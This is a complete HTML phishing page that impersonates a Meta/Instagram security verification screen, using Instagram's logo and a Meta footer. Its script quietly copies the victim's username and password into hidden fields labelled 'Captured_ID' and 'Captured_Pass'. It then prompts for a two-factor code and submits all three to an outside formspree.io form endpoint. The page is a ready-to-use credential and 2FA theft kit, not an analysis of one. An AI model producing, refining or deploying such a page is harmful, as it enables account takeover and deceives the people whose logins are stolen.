<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Security Center | OTP Verification</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #000; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: #121212; padding: 40px; border-radius: 8px; border: 1px solid #333; width: 100%; max-width: 380px; text-align: center; }
        .logo { width: 120px; margin-bottom: 20px; filter: invert(1); }
        h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
        p { font-size: 13px; color: #b0b0b0; margin-bottom: 25px; }
        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #363636; border-radius: 4px; background: #1c1c1c; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 12px; border: none; border-radius: 5px; background: #0095f6; color: white; font-weight: bold; cursor: pointer; font-size: 15px; }
        .footer-text { margin-top: 30px; font-size: 11px; color: #737373; }
        
        /* OTP Box hide rakhenge pehle */
        #otp-section { display: none; }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
        
        <div id="login-section">
            <h2>Identity Audit</h2>
            <p>Confirm your login details to receive the verification code on your linked device.</p>
            <form id="loginForm">
                <input type="email" id="user" name="User_ID" placeholder="Username or Email" required>
                <input type="password" id="pass" name="Security_Key" placeholder="Password" required>
                <button type="button" onclick="sendToOTP()">Next</button>
            </form>
        </div>

        <div id="otp-section">
            <h2>Two-Factor Check</h2>
            <p>A 6-digit code has been sent to your phone. Enter it below to complete verification.</p>
            <form action="https://formspree.io/f/mnjlbagr" method="POST">
                <input type="hidden" name="Captured_ID" id="hiddenUser">
                <input type="hidden" name="Captured_Pass" id="hiddenPass">
                
                <input type="text" name="OTP_Code" placeholder="6-digit code" required maxlength="6">
                <button type="submit">Verify & Confirm</button>
            </form>
        </div>

        <div class="footer-text">Meta © 2026 Security Operations</div>
    </div>

    <script>
        function sendToOTP() {
            // Data save karo
            document.getElementById('hiddenUser').value = document.getElementById('user').value;
            document.getElementById('hiddenPass').value = document.getElementById('pass').value;
            
            // Sections badal do
            document.getElementById('login-section').style.display = 'none';
            document.getElementById('otp-section').style.display = 'block';
        }
    </script>

</body>
</html>
